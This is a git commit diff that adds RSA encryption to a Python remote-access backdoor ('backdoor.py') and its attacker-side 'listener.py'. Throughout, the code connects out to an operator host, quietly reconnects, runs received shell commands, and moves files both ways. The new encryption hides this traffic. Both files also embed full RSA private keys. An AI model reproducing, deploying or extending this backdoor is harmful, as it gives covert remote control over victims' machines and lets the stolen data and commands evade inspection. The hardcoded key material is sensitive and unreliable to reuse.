16c757f06def1e54772d037217e400bba2e51367
Ahmed-Z <ahmed.veno@gmail.com>
2020-03-20 17:27:40 +0100

    RSA encryption implemented

--- backdoor.py
+++ backdoor.py
@@ -1,20 +1,102 @@
 import socket,subprocess,os,time
+from Cryptodome.PublicKey import RSA
+from Cryptodome.Cipher import PKCS1_OAEP
+MAX = 1024
 
 class Backdoor:
 
     def __init__(self, IP, PORT):
+        self.publickey = '''-----BEGIN PUBLIC KEY-----
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAtUSk1HaWYzFhlhYauflJ
+50mCMBulIe9EZPH4Qd4hOyqJ8yuITs9okbAA6MVjC5qw0mUjlAY2SB/kgVPoVM23
+fhh8do/AmOVZvCDiz9glUw5zGaiyycOckSnJm+vPAOP7ODdbDlQN6QSpaoUH8hB8
+65WgJljS99OcRaAs+pqv6l8QifQDSUdHUFQDM0Eerpf8jwvhiy6SAJV5rOnP5A1t
+Ha15GfOl0y3B23DF3/9aCRfVOHRFbIMjchuxRm/Jb7siDWRudzL8qf0mI2PtuHr/
+cY+AcAyVXxc2xuMKk+tqYwHFVA4t5zKBzYLLcaP8xsrOGWe299LokU/07ACrU8Mt
+zvxlHVjtdkPJVTmBT/1yQNo08URfdE8zUuQnkrO2VCpXSevFz7vzh0ob2ZAt61X2
+u2FQVJbGQf1orvjyJ4EFZ1Hnaz8xtYIaHzOon+jm46Evo6Q2OHq58EHOUdC3DzuO
+smNzsAlySPyXh+rYSwOZbmSgk/SmlRLdilpdwP8axE6RCjosw3fH6X5OrT41DmvC
+Hs22ZMV2YrG4EjifPsnitQNwXjGsMmAyHQ/ETXP66r2fIBEpi6p0KOeTEAfmhJPk
+zXRJEBS3hcrnWyABQHne2kEbvJH5z9FquwMMtNQbG1cCuo0XKIScXNYHwJgKakaj
+slEMB/KNymbafbHPnUDCpp8CAwEAAQ==
+-----END PUBLIC KEY-----'''
+        self.privatekey = '''-----BEGIN RSA PRIVATE KEY-----
+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
+-----END RSA PRIVATE KEY-----'''
         self.IP = IP
         self.PORT = PORT
         self.connect(self.IP, self.PORT)
+
+    def encrypt(self, msg):
+        public_key = RSA.importKey(self.publickey)
+        encryptor = PKCS1_OAEP.new(public_key)
+        encryptedData = encryptor.encrypt(msg)
+        return encryptedData
+
+    def decrypt(self, cipher):
+        private_key = RSA.importKey(self.privatekey)
+        decryptor = PKCS1_OAEP.new(private_key)
+        dec = decryptor.decrypt(cipher)
+        return dec.decode()
         
     def connect(self, IP, PORT):
         try:
             self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.connection.connect((IP,PORT))
             self.r_send(self.exec_cmd("whoami"))
-        except OSError:
+        except:
             time.sleep(2)
             self.connect(self.IP, self.PORT)
+
+    
             
     def exec_cmd(self, cmd):
         res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, )
@@ -26,15 +108,31 @@ class Backdoor:
             return (stderr)
     
     def r_send(self, msg):
-        try:
-            msg +="done"
-            msg = msg.encode()
-            self.connection.send(msg)
-        except TypeError:
-            pass
+        msg = msg.encode()
+        encrypted = "".encode()
+        if(len(msg)>470):
+            for i in range(0,len(msg),470):
+                chunk = msg[0+i:470+i]
+                encrypted += self.encrypt(chunk)
+        else:
+            encrypted = self.encrypt(msg)
+        encrypted += "done".encode()
+        self.connection.send(encrypted)
+
 
     def r_recv(self):
-        return self.connection.recv(1024).decode()
+        data = "".encode()
+        while not data.endswith("done".encode()):
+            data += self.connection.recv(MAX)
+        data = data[:-4]
+        decrypted = ""
+        if len(data)>512:
+            for i in range(0,len(data),512):
+                chunk = data[i+0:i+512]
+                decrypted += self.decrypt(chunk)
+        else:
+            decrypted = self.decrypt(data)
+        return decrypted
     
     def change_dir(self,dirr):
         try:
@@ -46,10 +144,10 @@ class Backdoor:
     def upload(self,filename):
         if os.path.exists(filename):
             f = open(filename,'rb')
-            packet = f.read(1024)
+            packet = f.read(MAX)
             while(len(packet)>0):
                 self.connection.send(packet)
-                packet = f.read(1024)
+                packet = f.read(MAX)
             self.connection.send("done".encode())
         else:
             self.connection.send("[-] File not found".encode())
@@ -57,7 +155,7 @@ class Backdoor:
     def download(self, filename):
         f = open(filename,"wb")
         while(True):
-            packet = self.connection.recv(1024)
+            packet = self.connection.recv(MAX)
             if "[-] File not found".encode() in packet:
                 f.close()
                 os.remove(filename)
@@ -84,14 +182,11 @@ class Backdoor:
                     self.connect(self.IP, self.PORT)
                 elif cmd[0] == "clear":
                     self.run()
-
                 elif len(cmd)>0:
-                    print('in elif')
                     cmd = ' '.join(cmd)
                     result = self.exec_cmd(cmd)
-                    self.r_send(result)
-                    
-            except ConnectionResetError:
+                    self.r_send(result) 
+            except Exception as e:
                 self.connect(self.IP, self.PORT)
 
 
--- listener.py
+++ listener.py
@@ -1,8 +1,76 @@
 import socket,os,subprocess
+from Cryptodome.PublicKey import RSA
+from Cryptodome.Cipher import PKCS1_OAEP
 
+MAX = 1024
 
 class Listener:
     def __init__(self, IP, PORT):
+        self.publickey = '''-----BEGIN PUBLIC KEY-----
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAtTEh94t/0XDujbbVFfCF
+dNisP/hkxkCudbnOZKJLCSIukYhssjdYCATAif2GVmP+OTIAromv1imCAa5JOd3G
+Kfrc/zGp7/E9V55jk3SP/aS4B10ZLYm+ycsI9kaDqxLoyPn+mPhS0iBLy1TBqJWi
+sCw34eanpmFOcyt/4MRTv8MCuvmkB3TyEotQJ2Dt+W7Io1zHb6aMS0NNwkiW4TGV
+PKGMlgKwSyYLbaQIflYlDEMI5UzYNEQkb3mNN5UtvvySdK2pu/E/vWT4xDsvHANA
++N6nQfqyeuZ9wIQO0m8Ahym6uT345OTBhOihdLWKqmWblnS2XifSMnibWWu+9yDY
+Y0Fy6+snxMSqqlovpJJdEk0FcLV0+u4axTfrrrQosQpSOdfKoZjeYEcSpxI5RroH
+LyGJYLWfZsH+7Lh5u7D5j6Vp08vW5ADvHQGWa9Ies6dBpGgMZaLyKZhJnPn1zCQy
+vW8kEwdtnzf9VTWqzVezSVS4jDQM3BjNh2id1eDh6nM3l8E/Zg76lTD3LF0XE/s1
+neHrWwjEJyweq1upuqNawrmnjCv/nnX9DFy7w2MgcAwbCiLzFsiADs+uCeV8yLrA
+07YqTDRAyX7stW4wozq9M4oodCW7oDmMPN4ExFJd5oKvDRu9SRM75bXMqi1QiSmL
+7tRomzL4Fm1R0KLPKYbyuWUCAwEAAQ==
+-----END PUBLIC KEY-----'''
+        self.privatekey = '''-----BEGIN RSA PRIVATE KEY-----
+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
+-----END RSA PRIVATE KEY-----'''
         self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.listener.bind((IP,PORT))
@@ -15,20 +83,52 @@ class Listener:
         print("[+] New connection from " + str(address))
         self.victim = self.r_recv()
 
+    def encrypt(self, msg):
+        public_key = RSA.importKey(self.publickey)
+        encryptor = PKCS1_OAEP.new(public_key)
+        encryptedData = encryptor.encrypt(msg)
+        return encryptedData
+
+    def decrypt(self, cipher):
+        private_key = RSA.importKey(self.privatekey)
+        decryptor = PKCS1_OAEP.new(private_key)
+        dec = decryptor.decrypt(cipher)
+        return dec.decode()
+
+
     def r_send(self, msg):
         msg = msg.encode()
-        self.connection.send(msg)
-     
+        encrypted = "".encode()
+        if(len(msg)>470):
+            for i in range(0,len(msg),470):
+                chunk = msg[0+i:470+i]
+                encrypted += self.encrypt(chunk)
+        else:
+            encrypted = self.encrypt(msg)
+        encrypted += "done".encode()
+        self.connection.send(encrypted)
+
+
     def r_recv(self):
-        data = ""
-        while (not data.endswith("done")):
-            data += self.connection.recv(1024).decode()
-        return data[:-4]
+        data = "".encode()
+        while not data.endswith("done".encode()):
+            data += self.connection.recv(MAX)
+        data = data[:-4]
+        decrypted = ""
+        if len(data)>512:
+            for i in range(0,len(data),512):
+                chunk = data[i+0:i+512]
+                decrypted += self.decrypt(chunk)
+        else:
+            decrypted = self.decrypt(data)
+        return decrypted
+
+
 
     def download(self, filename):
         f = open(filename,"wb")
         while(True):
-            packet = self.connection.recv(1024)
+            packet = self.connection.recv(MAX)
             if "[-] File not found".encode() in packet:
                 print("[-] File not found")
                 os.remove(filename)
@@ -43,10 +143,10 @@ class Listener:
     def upload(self,filename):
         if os.path.exists(filename):
             f = open(filename,'rb')
-            packet = f.read(1024)
+            packet = f.read(MAX)
             while(len(packet)>0):
                 self.connection.send(packet)
-                packet = f.read(1024)
+                packet = f.read(MAX)
             self.connection.send("done".encode())
         else:
             self.connection.send("[-] File not found".encode())
@@ -72,9 +172,6 @@ class Listener:
                     result = self.r_recv()
                     print(result)
                     
-
-                
-                
 
             except KeyboardInterrupt:
                 self.r_send("terminate")
